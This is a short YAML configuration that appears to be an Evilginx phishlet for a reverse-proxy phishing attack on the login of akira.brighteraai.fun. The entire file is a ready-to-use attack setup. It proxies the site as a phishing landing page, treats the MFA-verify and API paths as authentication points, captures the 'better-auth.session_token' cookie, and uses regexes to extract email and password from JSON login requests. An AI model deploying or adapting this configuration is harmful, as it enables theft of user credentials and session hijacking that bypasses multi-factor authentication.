min_ver: '4.0.0'
proxy_hosts:
  - {phish_sub: 'akira', orig_sub: 'akira', domain: 'brighteraai.fun', session: true, is_landing: true, auto_filter: true}
sub_filters:
  # - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
auth_urls:
  - '/api/mfa/verify'
  - '/api/.*'
auth_tokens:
  - domain: 'akira.brighteraai.fun' # domain of the cookie
    path: '/api/mfa/verify'
    keys: ['better-auth.session_token'] # list of cookie names or seesion names
credentials:
  username:
    key: ''
    search: '"email":"([^"]*)'
    type: 'json'
  password:
    key: ''
    search: '"password":"([^"]*)'
    type: 'json'
# domain to be used as a landing page user sees
login:
  domain: 'akira.brighteraai.fun'
  path: '/' # path to login eg: /login
